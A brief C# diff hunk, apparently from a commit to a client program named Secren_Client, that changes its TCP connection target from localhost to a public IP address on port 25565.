@@ -15,7 +15,7 @@ namespace Secren_Client
             try
             {
 
-                ClientObject client = new ClientObject((object)new TcpClient("127.0.0.1", 25565));
+                ClientObject client = new ClientObject((object)new TcpClient("185.228.232.214", 25565));
                 client.Start();
             }
             catch (Exception ex)
